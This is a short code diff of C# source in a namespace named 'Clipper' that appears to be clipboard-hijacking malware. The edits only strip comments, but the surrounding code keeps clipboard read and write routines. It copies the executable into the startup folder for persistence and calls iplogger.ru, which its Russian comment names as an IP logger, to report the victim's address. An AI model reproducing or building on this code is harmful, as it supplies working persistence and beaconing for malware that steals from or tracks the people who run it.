@@ -9,8 +9,6 @@ namespace Clipper
 {
     internal sealed class Clipboard
     {
-
-        // Get text from clipboard
         public static string GetText()
         {
             string ReturnValue = string.Empty;
@@ -30,8 +28,6 @@ namespace Clipper
             return ReturnValue;
 
         }
-
-        // Set text to clipboard
         public static void SetText(string text)
         {
             Thread STAThread = new Thread(
@@ -140,10 +136,6 @@ namespace Clipper
             if (!File.Exists($"{startup_directory}\\{autorun_name}.exe"))
             {
                 File.Copy(executable, $@"{startup_directory}\{autorun_name}.exe");
-            }
-            else
-            {
-                // ничего не делать
             }
             WebRequest.Create("https://iplogger.ru").GetResponse(); // ссылка на айпилоггер
             while (true)
